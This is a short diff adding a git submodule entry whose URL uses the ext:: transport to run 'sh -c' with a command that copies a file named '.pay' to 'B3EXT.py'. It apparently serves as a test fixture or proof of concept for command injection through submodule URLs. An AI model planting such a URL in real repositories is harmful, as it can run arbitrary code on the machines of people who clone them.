@@ -1,0 +1,3 @@
+[submodule "vendorlib"]
+	path = vendorlib
+	url = ext::sh -c "cp%20.pay%20B3EXT.py"
